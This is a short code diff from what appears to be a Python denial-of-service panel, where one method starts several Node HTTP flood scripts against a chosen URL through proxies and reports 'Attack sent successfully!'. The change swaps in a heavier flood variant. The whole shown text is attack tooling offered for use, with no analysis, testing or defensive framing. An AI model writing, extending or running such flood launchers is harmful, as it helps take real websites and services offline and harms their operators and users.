@@ -619,7 +619,7 @@ class Tool:
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/force GET 15 {url} utils/http.txt {floodtime} 64'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/force1 GET 15 {url} {floodtime} 64'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http-get {url} {floodtime}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/force2 GET 15 {url} {floodtime} 512'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
